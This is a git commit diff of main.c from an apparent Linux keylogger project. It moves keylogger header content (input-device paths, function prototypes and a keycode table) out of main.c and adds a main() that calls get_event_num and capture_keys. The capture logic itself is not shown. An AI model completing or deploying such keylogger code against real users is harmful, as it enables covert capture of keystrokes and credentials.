085c98e3f3267db305af63a4ec4ab85ebd5226e5
talroz532 <67608539+talroz532@users.noreply.github.com>
2022-06-28 14:47:18 +0300

    Update main.c

--- main.c
+++ main.c
@@ -1,87 +1,16 @@
-#ifndef KEYLOGGER_H
-#define KEYLOGGER_H
+#define _CRT_SECURE_NO_WARNINGS
 
-#define GET_EVENT_PATH "/proc/bus/input/devices"
-#define EVENT_PATH "/dev/input/event"
-#define BUFF_LINE 128
-#define BUFF_CHUNK (128 * 8)
-char get_event_num();
-int capture_keys(char *event_num);
+#include <stdio.h>
+#include <stdlib.h>
+#include <string.h>
 
-//was taken from https://github.com/SCOTPAUL/keylog
- char *keycodes[] = {
-    "RESERVED",
-    "ESC",
-    "1",
-    "2",
-    "3",
-    "4",
-    "5",
-    "6",
-    "7",
-    "8",
-    "9",
-    "0",
-    "MINUS",
-    "EQUAL",
-    "BACKSPACE",
-    "TAB",
-    "Q",
-    "W",
-    "E",
-    "R",
-    "T",
-    "Y",
-    "U",
-    "I",
-    "O",
-    "P",
-    "LEFTBRACE",
-    "RIGHTBRACE",
-    "ENTER",
-    "LEFTCTRL",
-    "A",
-    "S",
-    "D",
-    "F",
-    "G",
-    "H",
-    "J",
-    "K",
-    "L",
-    "SEMICOLON",
-    "APOSTROPHE",
-    "GRAVE",
-    "LEFTSHIFT",
-    "BACKSLASH",
-    "Z",
-    "X",
-    "C",
-    "V",
-    "B",
-    "N",
-    "M",
-    "COMMA",
-    "DOT",
-    "SLASH",
-    "RIGHTSHIFT",
-    "KPASTERISK",
-    "LEFTALT",
-    "SPACE",
-    "CAPSLOCK",
-    "F1",
-    "F2",
-    "F3",
-    "F4",
-    "F5",
-    "F6",
-    "F7",
-    "F8",
-    "F9",
-    "F10",
-    "NUMLOCK",
-    "SCROLLLOCK"
-};
+#include "keylogger.h"
+
+int main(){
 
 
-#endif //KEYLOGGER_H
+char event_num = get_event_num();
+capture_keys(&event_num);
+
+    return 0;
+} 
